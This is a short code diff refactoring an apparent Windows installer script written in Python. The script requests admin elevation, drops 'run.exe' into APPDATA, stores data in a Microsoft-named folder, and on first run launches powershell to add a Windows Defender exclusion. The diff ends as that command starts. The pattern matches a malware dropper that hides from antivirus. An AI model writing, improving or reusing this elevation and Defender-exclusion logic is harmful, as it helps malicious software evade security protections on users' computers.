@@ -30,7 +30,7 @@ def elevate_if_needed():
         ctypes.windll.shell32.ShellExecuteW(
             None,
             "runas",
-            sys.executable if getattr(sys, "frozen", False) else sys.executable,
+            sys.executable,
             f'"{script}" {params}' if not getattr(sys, "frozen", False) else params,
             None,
             1,
@@ -44,20 +44,18 @@ def main():
 
     run_dir = os.path.join(os.getenv("APPDATA"), "run")
     run_exe = os.path.join(run_dir, "run.exe")
-    dat_dir = os.path.join(os.path.join(os.getenv("APPDATA"), "Microsoft"), "run")
+    dat_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "run")
     dat_file = os.path.join(dat_dir, "run.dat")
-    temp_dir = os.path.join(os.getenv("TEMP"), "run")
 
     os.makedirs(run_dir, exist_ok=True)
     os.makedirs(dat_dir, exist_ok=True)
-    os.makedirs(temp_dir, exist_ok=True)
 
     is_update = os.path.exists(dat_file)
 
     # Add Defender exclusion
     if not is_update:
         print("Adding Defender exclusion...")
-        res = subprocess.run(
+        subprocess.run(
             [
                 "powershell.exe",
                 "-Command",
